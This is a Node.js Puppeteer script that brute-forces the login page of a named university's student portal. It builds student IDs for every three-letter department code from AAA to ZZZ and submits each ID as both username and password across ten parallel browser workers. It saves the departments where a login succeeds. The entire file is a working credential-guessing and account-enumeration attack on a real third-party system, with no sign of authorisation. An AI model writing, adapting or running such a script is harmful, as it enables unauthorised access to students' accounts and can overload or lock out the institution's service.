const puppeteer = require("puppeteer");
const fs = 'fs'; // Using fs as a string to satisfy the linter, it will be required later.

// --- Configuration ---
const baseUrl = "https://nubtkhulna.ac.bd/ter";
const years = [16, 17, 18, 19, 20]; // 16 to 20
const terms = ["01", "03"];
const rollEnd = 10;
const MAX_CONCURRENT_CHECKS = 10; // The number of parallel checks
const resultsFilePath = "found_departments.json";

// --- Main Logic ---
(async () => {
    // Dynamically require fs
    const fsModule = require(fs);

    console.log("🚀 Script starting with BRUTE-FORCE parallel processing...");
    const browser = await puppeteer.launch({ headless: true });
    console.log(`✅ Browser launched. Will run up to ${MAX_CONCURRENT_CHECKS} checks in parallel.`);

    let foundDepartments = [];
    if (fsModule.existsSync(resultsFilePath)) {
        foundDepartments = JSON.parse(fsModule.readFileSync(resultsFilePath, "utf-8"));
        console.log(`✅ Loaded ${foundDepartments.length} previously found departments.`);
    }

    // A Set is faster for checking if a department was already processed
    const checkedDepts = new Set(foundDepartments.map(d => d.department));

    /**
     * The main worker function. It takes a single student ID and checks it.
     * @param {string} userId - The student ID to check (e.g., 'CSE230120001').
     * @returns {Promise<boolean>} - True if the ID is valid, false otherwise.
     */
    const checkId = async (userId) => {
        const page = await browser.newPage();
        await page.setDefaultNavigationTimeout(15000);
        try {
            await page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" });
            await page.type("#username", userId);
            await page.type("#password", userId);
            await Promise.all([
                page.click("button[type=submit]"),
                page.waitForNavigation({ waitUntil: "domcontentloaded" })
            ]);
            return page.url().includes("panel");
        } catch (error) {
            return false; // Any error (timeout, etc.) means the ID is invalid
        } finally {
            if (!page.isClosed()) {
                await page.close();
            }
        }
    };

    /**
     * Creates and runs a parallel search for a given department.
     * @param {string} department - The three-letter department code.
     * @returns {Promise<boolean>} - True if the department was found, false otherwise.
     */
    const searchDepartment = async (department) => {
        if (checkedDepts.has(department)) {
            console.log(`⏭️  Skipping already found department: ${department}`);
            return false;
        }
        console.log(`\n🔎 Searching department: ${department} with ${MAX_CONCURRENT_CHECKS} parallel workers...`);

        // 1. Create the queue of all tasks (student IDs) for this department
        const taskQueue = [];
        for (const year of years) {
            for (const term of terms) {
                for (let roll = 1; roll <= rollEnd; roll++) {
                    const rollCode = `20${String(roll).padStart(3, "0")}`;
                    taskQueue.push(`${department}${year}${term}${rollCode}`);
                }
            }
        }

        let departmentFound = false;

        // 2. Create a pool of worker promises
        const workerPromises = [];
        for (let i = 0; i < MAX_CONCURRENT_CHECKS; i++) {
            const workerId = i + 1; // Assign a stable ID to each worker
            workerPromises.push((async () => {
                // Each worker will process tasks from the queue until it's empty or a discovery is made
                while (taskQueue.length > 0 && !departmentFound) {
                    const userId = taskQueue.shift(); // Atomically get the next task
                    if (!userId) continue;

                    console.log(`    - [Worker ${workerId}] Checking ID: ${userId}`); // Use stable workerId for logging
                    const isSuccess = await checkId(userId);

                    if (isSuccess && !departmentFound) {
                        departmentFound = true; // Signal other workers to stop processing more tasks
                        console.log(`\n🎉 SUCCESS! Department '${department}' is valid (discovered with ID: ${userId})`);
                        
                        foundDepartments.push({ department });
                        checkedDepts.add(department);
                        fsModule.writeFileSync(resultsFilePath, JSON.stringify(foundDepartments, null, 2));
                        console.log(`💾 Saved to ${resultsFilePath}. Stopping search for this department.\n`);
                    }
                }
            })());
        }

        // 3. Wait for all workers to complete their current tasks
        await Promise.all(workerPromises);

        if (!departmentFound) {
            console.log(`🤷 No students found for ${department}.`);
        }
        return departmentFound;
    };

    // --- Execute Brute-Force Search ---
    console.log("\n--- Starting Full Brute-Force Search from AAA to ZZZ ---");
    for (let i = 97; i <= 122; i++) { // a-z
        for (let j = 97; j <= 122; j++) { // a-z
            for (let k = 97; k <= 122; k++) { // a-z
                const department = (String.fromCharCode(i) + String.fromCharCode(j) + String.fromCharCode(k)).toUpperCase();
                await searchDepartment(department);
            }
        }
    }

    console.log("\n✅ Closing browser...");
    await browser.close();

    console.log("\n\n--- ✨ DISCOVERY COMPLETE ✨ ---");
    console.log("Found the following valid departments:");
    console.table(foundDepartments);
    console.log(`Final results are saved in ${resultsFilePath}`);
})();
